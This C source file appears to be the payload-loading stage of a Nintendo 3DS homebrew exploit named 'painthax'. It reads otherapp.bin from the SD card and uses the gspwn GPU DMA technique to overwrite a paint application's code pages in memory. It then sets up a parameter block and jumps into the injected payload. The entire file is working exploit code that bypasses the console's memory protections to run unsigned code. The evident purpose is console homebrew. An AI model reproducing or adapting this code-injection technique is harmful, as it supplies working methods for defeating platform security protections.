#include "imports.h"

#include <3ds.h>
#include "utils.h"
#include "filesystem.h"

void _main()
{

	Result ret = 0;

	_DSP_UnloadComponent(dspHandle);
	_DSP_RegisterInterruptEvents(dspHandle, 0x0, 0x2, 0x2);

	Handle file = 0;
	FS_Archive sdmc = (FS_Archive){ARCHIVE_SDMC, (FS_Path){PATH_EMPTY, 1, (u8*)""}};
	ret = _FSUSER_OpenFileDirectly(fsHandle, &file, sdmc, _fsMakePath(PATH_ASCII, "/painthax/otherapp.bin"), FS_OPEN_READ, 0);

	if(!ret)
	{
		u64 otherapp_size = 0;
		_FSFILE_GetSize(file, &otherapp_size);

		u32 bytes_read = 0;
		_FSFILE_Read(file, &bytes_read, 0, (u32*)LINEAR_BUFFER, otherapp_size);

		_FSFILE_Close(file);

		otherapp_size = (otherapp_size + 0xFFF) & ~0xFFF;

		u32 otherapp_pages_count = otherapp_size >> 12;
		u32 otherapp_pages[otherapp_pages_count];
		memset(otherapp_pages, 0x0, sizeof(u32)*otherapp_pages_count);

		u32 linear_base = 0x30000000 + (*(u8*)PAINT_APPMEMTYPE_PTR == 0x6 ? 0x07c00000 : 0x04000000) - PAINT_MAX_CODEBIN_SIZE;

		for(unsigned int i = 0, l = 0x30000000, pages = 0; i < PAINT_MAX_CODEBIN_SIZE && pages < otherapp_pages_count; i+=0x1000, l+=0x20)
		{
			gspwn((void*)l, (void*)(linear_base + i), 0x1000);
			svcSleepThread(0x100000);

			for(u8 j = 0; j < otherapp_pages_count; j++)
			{
				if(!memcmp((void*)l, (void*)(0x101000 + j*0x1000), 0x20))
				{
					otherapp_pages[j] = i;
					pages++;
				}
			}
		}

		_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)LINEAR_BUFFER, otherapp_size);
		for(int i = 0; i < otherapp_pages_count; i++)
		{
			gspwn((void*)(linear_base + otherapp_pages[i]), (void*)(LINEAR_BUFFER+i*0x1000), 0x1000);
			svcSleepThread(0x100000);
		}
	}

	// ghetto dcache invalidation
	// don't judge me
	int i, j;
	// for(k=0; k<0x2; k++)
	for(j=0; j<0x4; j++)
		for(i=0; i<0x01000000/0x4; i+=0x4)
			LINEAR_BUFFER[i+j]^=0xDEADBABE;

	u8* top_framebuffer = &LINEAR_BUFFER[0x00100000];
  u8* low_framebuffer = &top_framebuffer[0x00046500];
  _GSPGPU_SetBufferSwap(*gspHandle, 0, (GSPGPU_FramebufferInfo){0, (u32*)top_framebuffer, (u32*)top_framebuffer, 240 * 3, (1<<8)|(1<<6)|1, 0, 0});
  _GSPGPU_SetBufferSwap(*gspHandle, 1, (GSPGPU_FramebufferInfo){0, (u32*)low_framebuffer, (u32*)low_framebuffer, 240 * 3, 1, 0, 0});

	// run payload
	{
		void (*payload)(u32* paramlk, u32* stack_pointer) = (void*)0x00101000;
		u32* paramblk = (u32*)LINEAR_BUFFER;

		paramblk[0x1c >> 2] = PAINT_GSPGPU_GXCMD4;
		paramblk[0x20 >> 2] = PAINT_GSPGPU_FLUSHDATACACHE_WRAPPER;
		paramblk[0x48 >> 2] = 0x8d; // flags
		paramblk[0x58 >> 2] = PAINT_GSPGPU_HANDLE;
		paramblk[0x64 >> 2] = 0x08010000;

		payload(paramblk, (u32*)(0x10000000 - 4));
	}

	*(u32*)ret = 0xdead0008;
}
